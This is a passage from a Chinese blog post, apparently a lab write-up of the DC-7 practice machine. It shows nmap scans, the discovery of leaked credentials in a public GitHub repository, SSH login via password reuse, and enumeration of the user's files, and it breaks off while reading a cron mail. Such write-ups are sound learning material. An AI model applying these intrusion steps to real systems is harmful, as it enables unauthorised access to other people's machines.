@@ -1,0 +1,760 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="DC-7 靶机信息收集123456789101112┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.126Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-11 02:59 EDTNmap scan report for 192.168.56.126Host is u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-7 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/07/c67b9582251d.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="DC-7 靶机信息收集123456789101112┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.126Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-07-11 02:59 EDTNmap scan report for 192.168.56.126Host is u">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/150cdb5ed6cb4f340a6f1689bd4a0efb_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/dce52fb8d2b20c11f8f65bfa952278a3_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/3c8f7072043e9938212dd3838bb6e52b_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/75519cc14576809854d3b31fc8527f64_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/e158c95a2fb31449844473748a720d0f_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/02ecfc3e2ee9be21cadc36f7a10fc797_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/57bf196cbbaa1c98f1536c7530c9c4b7_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/98357999e91c53beec6fb6f396893f52_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/f770fa4a66d53da68c1046c7543d8b63_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/425ff94df51eb5ebda0b1c59ad7d47cb_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/712d5b5a7d6a33934c22e404a061f01b_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/900b8ead9981b603e1e7c3ca02604e8a_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/07949941f93565f58f3edce13b578dbf_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/b9ad439ebb1f864127848aa4767d74b1_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/b0386ee4c8561410ffe905f70bd210cd_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/65f0dcd8ea718f0316c0d255a107fdf1_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/8a5f3c55f558587336de9b382851a68a_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/7981a750cc45d7e1a4eda2c4e600bbfe_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/6bd47a7b0e41ef5b2827bfde1087049b_MD5.png">
+<meta property="article:published_time" content="2023-07-11T12:30:37.000Z">
+<meta property="article:modified_time" content="2023-07-11T13:43:24.898Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/150cdb5ed6cb4f340a6f1689bd4a0efb_MD5.png">
+  
+  
+  
+  <title>DC-7 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DC-7 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-07-11 20:30" pubdate>
+          2023年7月11日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          105 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">DC-7 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="DC-7-靶机"><a href="#DC-7-靶机" class="headerlink" title="DC-7 靶机"></a>DC-7 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.126<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-11 02:59 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.126<br>Host is up (0.00016s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:A8:C2:95 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.61 seconds<br></code></pre></td></tr></table></figure>
+
+<p>只开放了两个端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --top-ports 20 -sU 192.168.56.126  <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-11 03:00 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.126<br>Host is up (0.00052s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    open|filtered dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    open|filtered tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   open|filtered netbios-ssn<br>161/udp   open|filtered snmp<br>162/udp   open|filtered snmptrap<br>445/udp   open|filtered microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   open|filtered route<br>631/udp   closed        ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  open|filtered upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp open|filtered unknown<br>MAC Address: 08:00:27:A8:C2:95 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.84 seconds<br></code></pre></td></tr></table></figure>
+
+<p>UDP 扫描没收获</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 192.168.56.126               <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-11 03:03 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.126<br>Host is up (0.00077s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA)<br>|   256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:<span class="hljs-built_in">dd</span>:f4:8f (ECDSA)<br>|_  256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.25 ((Debian))<br>|_http-title: Welcome to DC-7 | D7<br>| http-robots.txt: 22 disallowed entries (15 shown)<br>| /core/ /profiles/ /README.txt /web.config /admin/ <br>| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ <br>| /user/password/ /user/login/ /user/logout/ /index.php/admin/ <br>|_/index.php/comment/reply/<br>|_http-server-header: Apache/2.4.25 (Debian)<br>|_http-generator: Drupal 8 (https://www.drupal.org)<br>MAC Address: 08:00:27:A8:C2:95 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 15.76 seconds<br></code></pre></td></tr></table></figure>
+
+<p>有 <code>robots.txt</code> 文件，nmap 漏洞脚本扫描一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 192.168.56.126               <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-11 03:07 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.126<br>Host is up (0.00042s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.126<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: http://192.168.56.126:80/<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/user/login<br>|     Form <span class="hljs-built_in">id</span>: user-login-form<br>|     Form action: /user/login<br>|     <br>|     Path: http://192.168.56.126:80/user/login<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/node/1<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/search/node<br>|     Form <span class="hljs-built_in">id</span>: search-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/search/node<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/user/password<br>|     Form <span class="hljs-built_in">id</span>: user-pass<br>|     Form action: /user/password<br>|     <br>|     Path: http://192.168.56.126:80/user/password<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/user/login<br>|     Form <span class="hljs-built_in">id</span>: user-login-form<br>|     Form action: /user/login<br>|     <br>|     Path: http://192.168.56.126:80/user/login<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/node/<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/search/node/help<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/search/node<br>|     Form <span class="hljs-built_in">id</span>: search-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/search/node<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/search/node<br>|     Form <span class="hljs-built_in">id</span>: search-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/search/node<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|     Form action: /search/node<br>|     <br>|     Path: http://192.168.56.126:80/search/node/<br>|     Form <span class="hljs-built_in">id</span>: search-form<br>|     Form action: /search/node/<br>|     <br>|     Path: http://192.168.56.126:80/search/node/<br>|     Form <span class="hljs-built_in">id</span>: search-block-form<br>|_    Form action: /search/node<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-enum: <br>|   /rss.xml: RSS or Atom feed<br>|   /robots.txt: Robots file<br>|   /INSTALL.txt: Drupal file<br>|   /: Drupal version 8 <br>|_  /README.txt: Interesting, a readme.<br>MAC Address: 08:00:27:A8:C2:95 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 115.43 seconds<br></code></pre></td></tr></table></figure>
+
+<p>依然没收获，看看 web 界面吧</p>
+<h2 id="web-服务查看"><a href="#web-服务查看" class="headerlink" title="web 服务查看"></a>web 服务查看</h2><p><img src="/pic/150cdb5ed6cb4f340a6f1689bd4a0efb_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>提示爆破和目录爆破是无效的，要跳出靶机向外看，这句话卡了我好久，甚至尝试了用 drupal 的新漏洞尝试能不能打进去，都失败了。唯一能确定的是，我通过重置密码的界面，确定了 <code>DC7USER</code> 是一个用户名。</p>
+<h2 id="网络情报"><a href="#网络情报" class="headerlink" title="网络情报"></a>网络情报</h2><p>最后看了眼 WP，才意识到这个 <code>@DC7USER</code> 实际上常见于 GitHub 或者推特的个人账户，一是自己敏感度的问题，二是一些网络习惯。</p>
+<p><img src="/pic/dce52fb8d2b20c11f8f65bfa952278a3_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>点进去 github 链接，发现是后台的源码，也很合理。接下来思路就很顺畅了，找配置文件看看数据库密码是否被重用</p>
+<p><img src="/pic/3c8f7072043e9938212dd3838bb6e52b_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="密码重用"><a href="#密码重用" class="headerlink" title="密码重用"></a>密码重用</h2><p>用用户名和密码登录后台失败，考虑到还开着 22 端口因此尝试 ssh 登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_7]<br>└─$ ssh dc7user@192.168.56.127    <br>The authenticity of host <span class="hljs-string">&#x27;192.168.56.127 (192.168.56.127)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:BDWqBUcitB8KKGYDyoeZkt2C/aXhZ7gi5xSEtOSB+Rk.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.56.127<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">dc7user@192.168.56.127&#x27;</span>s password: <br>Linux dc-7 4.9.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>No mail.<br>Last login: Fri Aug 30 03:10:09 2019 from 192.168.0.100<br>dc7user@dc-7:~$ <span class="hljs-built_in">whoami</span><br>dc7user<br>dc7user@dc-7:~$ <span class="hljs-built_in">id</span><br>uid=1000(dc7user) gid=1000(dc7user) <span class="hljs-built_in">groups</span>=1000(dc7user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)<br>dc7user@dc-7:~$ sudo -l<br>-bash: sudo: <span class="hljs-built_in">command</span> not found<br>dc7user@dc-7:/usr/bin$ <span class="hljs-built_in">uname</span> -a<br>Linux dc-7 4.9.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64 GNU/Linux</span><br><br></code></pre></td></tr></table></figure>
+
+<p>看看家目录下有没有什么有价值的东西</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">dc7user@dc-7:~$ <span class="hljs-built_in">ls</span> -liah<br>total 40K<br>262914 drwxr-xr-x 5 dc7user dc7user 4.0K Aug 30  2019 .<br>262321 drwxr-xr-x 3 root    root    4.0K Aug 29  2019 ..<br>143381 drwxr-xr-x 2 dc7user dc7user 4.0K Aug 30  2019 backups<br>269898 lrwxrwxrwx 1 dc7user dc7user    9 Aug 29  2019 .bash_history -&gt; /dev/null<br>268307 -rw-r--r-- 1 dc7user dc7user  220 Aug 29  2019 .bash_logout<br>268283 -rw-r--r-- 1 dc7user dc7user 3.9K Aug 29  2019 .bashrc<br>271693 drwxr-xr-x 3 dc7user dc7user 4.0K Aug 29  2019 .drush<br>143656 drwx------ 3 dc7user dc7user 4.0K Aug 29  2019 .gnupg<br>272762 -rw------- 1 dc7user dc7user 7.8K Aug 30  2019 mbox<br>268426 -rw-r--r-- 1 dc7user dc7user  675 Aug 29  2019 .profile<br></code></pre></td></tr></table></figure>
+
+<p>有个 mbox 文件和.drush, .gnupg 文件夹，问问 chatgpt 吧</p>
+<p><img src="/pic/75519cc14576809854d3b31fc8527f64_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>进入到.drush 文件夹中并没有看到 yml 文件，那就先看看 mbox 吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">dc7user@dc-7:~$ <span class="hljs-built_in">cat</span> mbox<br><br>From root@dc-7 Thu Aug 29 17:00:22 2019<br>Return-path: &lt;root@dc-7&gt;<br>Envelope-to: root@dc-7<br>Delivery-<span class="hljs-built_in">date</span>: Thu, 29 Aug 2019 17:00:22 +1000<br>Received: from root by dc-7 with <span class="hljs-built_in">local</span> (Exim 4.89)<br>        (envelope-from &lt;root@dc-7&gt;)<br>        <span class="hljs-built_in">id</span> 1i3EPu-0000CV-5C<br>        <span class="hljs-keyword">for</span> root@dc-7; Thu, 29 Aug 2019 17:00:22 +1000<br>From: root@dc-7 (Cron Daemon)<br>To: root@dc-7<br>Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=UTF-8<br>Content-Transfer-Encoding: 8bit<br>X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt;<br>X-Cron-Env: &lt;SHELL=/bin/sh&gt;<br>X-Cron-Env: &lt;HOME=/root&gt;<br>X-Cron-Env: &lt;LOGNAME=root&gt;<br>Message-Id: 